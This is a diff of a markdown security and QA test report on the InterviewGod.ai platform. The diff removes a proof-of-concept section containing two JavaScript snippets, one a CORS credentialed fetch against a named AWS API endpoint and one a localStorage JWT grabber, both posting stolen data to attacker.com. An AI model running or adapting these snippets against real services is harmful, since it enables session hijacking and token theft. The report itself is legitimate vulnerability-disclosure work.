@@ -110,23 +110,6 @@ BUG-011–012: Same as 009–010
 
 ## Attack Scenarios (PoC Ready)
 
-### 1. Full Session Hijack via CORS (30 seconds)
-```js
-fetch('https://pp0jjs0uq1.execute-api.ap-south-1.amazonaws.com/workspace/detail', {
-  credentials: 'include'
-}).then(r => r.json()).then(data => fetch('https://attacker.com/steal', {
-  method: 'POST', body: JSON.stringify(data)
-}));
-```
-
-### 2. Steal JWT via Malicious Extension
-```js
-setInterval(() => {
-  const token = localStorage.getItem('token') || [...console.history].find(h => h.includes('9b8403f9eafda'));
-  if (token) fetch('https://attacker.com/log', {method:'POST', body:token});
-}, 1000);
-```
-
 ---
 
 ## Recommended Fix Priority
@@ -145,17 +128,6 @@ gantt
     Automated Testing Suite       :2025-12-01, 30d
     Security Headers + WAF        :2025-12-15, 14d
 
-
----
-
-## Next Steps for InterviewGod Team
-
-1. **Clone this repo privately**
-2. Run: `git pull && open REPORT.md`
-3. Assign bugs in Jira/GitHub Issues using `IG-XXX` labels
-4. Schedule remediation sync (I’m available for follow-up testing)
-5. Consider bug bounty credits 😉
-
 ---
 CONCLUSION
 This comprehensive testing analysis of InterviewGod.ai has identified 45 significant bugs across security, functionality, UI/UX, AI/ML, and performance categories. The findings indicate that while the platform has strong potential and innovative AI-powered features, there are critical security vulnerabilities and functional issues that must be addressed before production deployment.
@@ -167,7 +139,7 @@ Foundation is solid: The core architecture appears sound; most issues can be res
 
 TESTING COVERAGE SUMMARY
 Areas Tested
-✅ Authentication & Authorization
+ ✅ Authentication & Authorization
  ✅ AI Question Generation
  ✅ Candidate Management
  ✅ Interview Scheduling
@@ -180,11 +152,13 @@ Areas Tested
  ✅ Security Controls
  ✅ API Integration
  ✅ Error Handling
+
+ ---
+ ```
 TESTING METHODOLOGY
-Approach
+Approach:
 Testing was conducted using a systematic black-box testing methodology combined with exploratory testing techniques. The following approach was employed:
 Manual Functional Testing
-
 
 Login/authentication flows
 Core feature functionality (AI question generation, scheduling, candidate management)
@@ -192,13 +166,11 @@ Navigation and workflow testing
 Form validation and data handling
 UI/UX Testing
 
-
 Visual consistency across pages
 Responsive design validation (desktop, tablet, mobile)
 Browser compatibility (Chrome, Firefox, Safari)
 Accessibility compliance (WCAG 2.1 guidelines)
 AI Output Validation
-
 
 Question generation accuracy
 Prompt injection testing
@@ -206,14 +178,12 @@ Output consistency and relevance
 Hallucination detection
 Security Testing
 
-
 Authentication mechanisms
 Session management
 Input validation and sanitization
 CORS policy evaluation
 Client-side security controls
 Performance Testing
-
 
 Page load times
 API response times
